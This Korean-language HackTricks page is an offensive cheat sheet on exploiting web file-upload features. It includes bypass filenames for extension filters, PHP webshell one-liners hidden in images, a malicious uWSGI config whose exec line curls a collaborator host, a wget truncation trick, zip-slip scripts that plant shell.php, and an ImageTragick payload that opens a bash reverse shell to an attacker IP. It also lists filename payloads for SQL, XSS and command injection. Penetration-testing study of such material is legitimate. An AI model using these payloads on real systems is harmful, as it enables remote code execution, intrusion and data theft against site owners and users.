# 파일 업로드

{{#include ../../banners/hacktricks-training.md}}

## 파일 업로드 일반 방법론

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### 파일 확장자 검사 우회

1. 적용된다면, **이전 목록의 확장자들을 확인**하세요. 또한 일부 **대문자**로도 테스트하세요: _pHp, .pHP5, .PhAr ..._
2. _실행 확장자 앞에 유효한 확장자를 **추가**해보세요 (이전 확장자들도 사용):_
- _file.png.php_
- _file.png.Php5_
3. 파일명 끝에 **특수문자**를 추가해보세요. Burp로 모든 **ascii** 및 **Unicode** 문자를 **브루트포스**할 수 있습니다. (_이전에 언급한 **확장자들**을 이용해 시도할 수도 있습니다_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. **확장자 파서**를 속이는 방식으로 보호를 우회해보세요. 예: **확장자 중복** 또는 확장자 사이에 **정크 데이터(널 바이트 등)** 추가. _더 나은 페이로드를 위해 이전 확장자들을 함께 사용하세요._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. 이전 검사에 **추가 확장자 레이어**를 더해보세요:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. **실행 확장자를 유효한 확장자 앞에 넣어** 서버가 잘못 구성된 경우를 노리세요. (Apache에서 확장자가 `.php`를 포함하면 실행되는 설정을 악용할 때 유용)
- _ex: file.php.png_
7. **Windows의 NTFS alternate data stream (ADS)** 사용을 시도하세요. 이 경우 금지된 확장자 뒤와 허용된 확장자 사이에 콜론 ":"이 삽입됩니다. 결과적으로 **금지된 확장자를 가진 빈 파일**이 서버에 생성될 수 있습니다 (예: "file.asax:.jpg"). 이 파일은 이후 다른 기법으로 편집될 수 있습니다(예: 짧은 파일명 사용). "**::$data**” 패턴을 사용해 비어있지 않은 파일을 만들 수도 있습니다. 따라서 이 패턴 뒤에 점을 추가하면 추가 제한을 우회하는 데 유용할 수 있습니다 (예: "file.asp::$data.")
8. 파일명 길이 제한을 깨보세요. 유효한 확장자가 잘리고 악성 PHP가 남을 수 있습니다. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Content-Type, Magic Number, 압축 및 리사이즈 우회

- **Content-Type** 검사를 우회하려면 요청의 **Content-Type 헤더** 값을 다음으로 설정해보세요: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **워드리스트**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** 검사를 우회하려면 파일 시작 부분에 실제 이미지의 **바이트**를 추가해 `file` 명령을 혼동시키거나, 셸 코드를 **메타데이터** 안에 넣으세요:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` 또는 이미지를 직접 페이로드로 조작할 수도 있습니다:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- 이미지에 **압축**이 적용되는 경우(예: PHP-GD 같은 라이브러리를 사용할 때) 위 기법들은 무용지물이 될 수 있습니다. 이런 경우 **PLTE chunk** [**기법 (링크)**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 사용해 압축을 견디는 텍스트를 삽입할 수 있습니다.
- [**코드가 있는 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- 웹 페이지가 PHP-GD의 `imagecopyresized` 또는 `imagecopyresampled` 같은 함수로 **이미지 리사이즈**를 수행하는 경우가 있습니다. 이럴 때는 **IDAT chunk** [**기법 (링크)**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 이용해 압축을 견디는 텍스트를 삽입할 수 있습니다.
- [**코드가 있는 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- PHP-GD의 `thumbnailImage` 함수를 사용하는 리사이즈를 견디는 페이로드를 만드는 다른 기법도 있습니다. 또는 **tEXt chunk** [**기법 (링크)**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)를 사용해 압축을 견디는 텍스트를 삽입할 수 있습니다.
- [**코드가 있는 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### 확인할 기타 트릭

- 이미 업로드된 파일의 이름을 **변경(rename)**할 수 있는 취약점을 찾아보세요 (확장자 변경).
- 백도어를 실행하기 위해 **Local File Inclusion** 취약점을 찾아보세요.
- **정보 유출 가능성**:
1. 같은 파일을 **여러 번** (동시에) 업로드해보세요.
2. 이미 존재하는 **파일명** 또는 **폴더명**과 같은 이름으로 업로드해보세요.
3. 파일명을 `"."`, "..", 또는 "..."로 업로드해보세요. 예: Windows의 Apache에서 애플리케이션이 "/www/uploads/"에 업로드하면, "." 파일명은 "/www/"에 "uploads"라는 파일을 생성할 수 있습니다.
4. NTFS에서 삭제하기 어려운 파일(예: **"…:.jpg"**)을 업로드해보세요. (Windows)
5. Windows에서 파일명에 `|<>*?”` 같은 **유효하지 않은 문자**를 포함해 업로드해보세요. (Windows)
6. CON, PRN, AUX, NUL, COM1... 같은 **예약된(금지된) 이름**을 사용해 Windows에 업로드해보세요.
- 실수로 피해자가 열었을 때 **코드가 실행되는 .exe**나 덜 의심스러운 **.html**을 업로드하는 것도 시도해보세요.

### 특수 확장자 트릭

PHP 서버에 파일을 업로드하려면 [코드 실행을 위한 **.htaccess** 트릭](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution)을 확인하세요.\
ASP 서버에 업로드한다면 [코드 실행을 위한 **.config** 트릭](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files)을 확인하세요.

`.phar` 파일은 자바의 `.jar`와 유사하지만 php용이며, **php 파일처럼 사용**될 수 있습니다(php로 실행하거나 스크립트에 include).
`.inc` 확장자는 종종 import 용도의 php 파일에 사용되므로, 어떤 경우에는 이 확장자가 실행되도록 허용되었을 수 있습니다.

## **Jetty RCE**

Jetty 서버에 XML 파일을 업로드할 수 있다면 [새로운 \*.xml 및 \*.war가 자동으로 처리되기 때문에 RCE를 얻을 수 있습니다](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** 따라서, 다음 이미지에서 언급된 것처럼 XML 파일을 `$JETTY_BASE/webapps/`에 업로드하면 셸을 기대할 수 있습니다!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

이 취약점에 대한 자세한 분석은 원본 리서치를 확인하세요: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) 취약점은 `.ini` 구성 파일을 수정할 수 있을 경우 uWSGI 서버에서 악용될 수 있습니다. uWSGI 구성 파일은 "magic" 변수, 플레이스홀더 및 연산자를 포함하는 특정 문법을 사용합니다. 특히 `@(filename)` 형식으로 사용되는 '@' 연산자는 파일 내용을 포함하기 위해 설계되었습니다. uWSGI가 지원하는 여러 스킴 중에서 "exec" 스킴은 프로세스 표준 출력에서 데이터를 읽을 수 있게 하며, `.ini` 구성 파일이 처리될 때 이를 조작하면 Remote Command Execution 또는 Arbitrary File Write/Read에 악용될 수 있습니다.

다음은 다양한 스킴을 보여주는 악의적인 `uwsgi.ini` 파일 예시를 고려하세요:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
페이로드의 실행은 설정 파일(configuration file)의 파싱 과정에서 발생합니다. 설정이 활성화되어 파싱되려면 uWSGI 프로세스를 재시작해야 하며(잠재적으로는 크래시 후이거나 Denial of Service 공격으로 인해) 또는 파일이 auto-reload로 설정되어 있어야 합니다. auto-reload 기능이 활성화되어 있으면 변경을 감지했을 때 지정된 간격으로 파일을 다시 로드합니다.

uWSGI의 설정 파일 파싱이 느슨하다는 점을 이해하는 것이 중요합니다. 구체적으로, 논의된 payload는 이미지나 PDF와 같은 바이너리 파일에 삽입될 수 있어 잠재적인 악용 범위를 더욱 넓힙니다.

## **wget File Upload/SSRF Trick**

어떤 경우 서버가 **`wget`**을 사용해 **파일을 다운로드**하고 사용자가 **URL**을 **지정**할 수 있습니다. 이런 경우 코드가 다운로드된 파일의 확장자가 허용 목록(whitelist)에 포함되어 있는지 검사해서 허용된 파일만 다운로드되도록 할 수 있습니다. 그러나, **이 체크는 우회될 수 있습니다.**\
**최대** 길이의 **파일명**은 **linux**에서 **255**이지만, **`wget`**은 파일명을 **236**자로 자릅니다. 당신은 "A"\*232+".php"+".gif"라는 파일을 다운로드할 수 있는데, 이 파일명은 체크를 우회합니다(이 예에서 ".gif"는 유효한 확장자이므로) 하지만 `wget`은 파일명을 "A"\*232+".php"로 변경합니다.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

일부 레거시 upload handlers는 `snprintf()` 또는 유사한 함수를 사용해 single-file upload에서 multi-file 배열을 구성하는데, 이를 속여 `_FILES` 구조를 위조할 수 있습니다. `snprintf()` 동작의 불일치와 잘림(truncation) 때문에 정교하게 제작된 단일 업로드가 서버 측에서 여러 인덱스된 파일로 보일 수 있으며, 엄격한 구조를 가정하는 로직(e.g., multi-file upload로 처리하여 안전하지 않은 분기를 택함)을 혼란시킬 수 있습니다. 오늘날에는 드물지만, 이 “index corruption” 패턴은 가끔 CTF나 오래된 코드베이스에서 다시 나타납니다.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 다른 폴더로 압축 해제

압축 해제 중 디렉터리에 예상치 못하게 파일이 생성되는 문제는 심각합니다. 처음에는 이러한 설정이 악성 파일 업로드로 인한 OS-level command execution을 방지할 수 있다고 생각할 수 있지만, ZIP 아카이브 포맷의 계층적 압축 지원과 directory traversal 기능을 악용하면 우회가 가능합니다. 이를 통해 공격자는 대상 애플리케이션의 decompression 기능을 조작하여 제약을 무력화하고 안전한 업로드 디렉터리를 탈출할 수 있습니다.

An automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). The utility can be used as shown:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
또한, **symlink trick with evilarc** 는 하나의 옵션입니다. 목표가 `/flag.txt` 같은 파일을 대상으로 하는 경우, 해당 파일을 가리키는 symlink를 시스템에 생성해야 합니다. 이렇게 하면 evilarc가 동작 중에 오류를 겪지 않습니다.

아래는 악성 zip 파일을 생성하는 데 사용되는 Python 코드의 예입니다:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**압축 악용을 통한 file spraying**

자세한 내용은 **원문 게시글을 확인하세요**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP 코드는 `$_REQUEST` 변수를 통해 전달된 명령을 실행하도록 작성됩니다.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: 여러 파일을 생성한 뒤, 이 파일들을 포함하는 zip 아카이브를 만듭니다.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: zip 내부 파일 이름을 vi 또는 hex editor로 변경하여 "xxA"를 "../"로 바꿔 디렉토리 트래버스합니다.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

이 콘텐츠를 이미지 확장자로 업로드하면 취약점 **(ImageMagick , 7.0.1-1)** 을 악용할 수 있습니다 (form the [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG에 PHP Shell 내장

PNG 파일의 IDAT chunk에 PHP shell을 내장하면 특정 이미지 처리 작업을 효과적으로 우회할 수 있습니다. PHP-GD의 `imagecopyresized` 및 `imagecopyresampled` 함수는 각각 이미지 리사이징 및 리샘플링에 일반적으로 사용되므로 이 맥락에서 특히 관련이 있습니다. 내장된 PHP shell이 이러한 작업의 영향을 받지 않는다는 점은 특정 상황에서 큰 이점입니다.

이 기술의 방법론과 잠재적 응용을 포함한 자세한 탐구는 다음 글에서 확인할 수 있습니다: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). 이 자료는 프로세스와 그 함의를 포괄적으로 이해하는 데 도움이 됩니다.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files는 사이버보안에서 독특한 도구로, 여러 파일 형식에 동시에 유효하게 존재할 수 있는 카멜레온처럼 동작합니다. 흥미로운 예로 [GIFAR](https://en.wikipedia.org/wiki/Gifar)가 있는데, 이는 GIF와 RAR 아카이브 둘 다로 작동하는 하이브리드입니다. 이러한 파일 조합은 이 페어링에 국한되지 않으며 GIF와 JS, PPT와 JS 같은 조합도 가능합니다.

polyglot files의 핵심 유용성은 파일 유형 기반으로 파일을 필터링하는 보안 조치를 우회할 수 있다는 점에 있습니다. 많은 애플리케이션에서는 잠재적으로 위험한 형식(e.g., JS, PHP, 또는 Phar 파일)을 줄이기 위해 JPEG, GIF 또는 DOC 같은 특정 파일 유형만 업로드를 허용하는 경우가 일반적입니다. 그러나 polyglot은 다중 파일 형식의 구조적 조건을 동시에 충족함으로써 이러한 제한을 은밀히 우회할 수 있습니다.

적응성에도 불구하고 polyglots는 한계에 봉착하기도 합니다. 예를 들어, polyglot이 PHAR 파일(PHp ARchive)과 JPEG를 동시에 겸할 수는 있지만, 업로드 성공 여부는 플랫폼의 파일 확장자 정책에 달려 있을 수 있습니다. 시스템이 허용 가능한 확장자에 대해 엄격하다면 polyglot의 단순한 구조적 이중성만으로는 업로드를 보장하지 못할 수 있습니다.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDF인 것처럼 유효한 JSON 업로드

허용되지 않은 경우에도 PDF 파일로 위조하여 유효한 JSON 파일을 업로드함으로써 파일 타입 탐지를 회피하는 방법 (기법 출처: **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: 처음 1024바이트 내에 `%PDF` 매직 바이트가 있으면 유효하다고 판단됩니다 (예시는 해당 글 참조).
- **`pdflib` library**: JSON의 필드 안에 가짜 PDF 포맷을 추가해 라이브러리가 이를 PDF로 인식하게 합니다 (예시 참조).
- **`file` binary**: 파일에서 최대 1048576 바이트까지 읽을 수 있습니다. 따라서 JSON을 그보다 크게 만들어 `file`이 내용을 JSON으로 파싱하지 못하게 한 뒤, JSON 내부에 실제 PDF의 초기 부분을 넣으면 PDF로 인식합니다.

## 참고자료

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
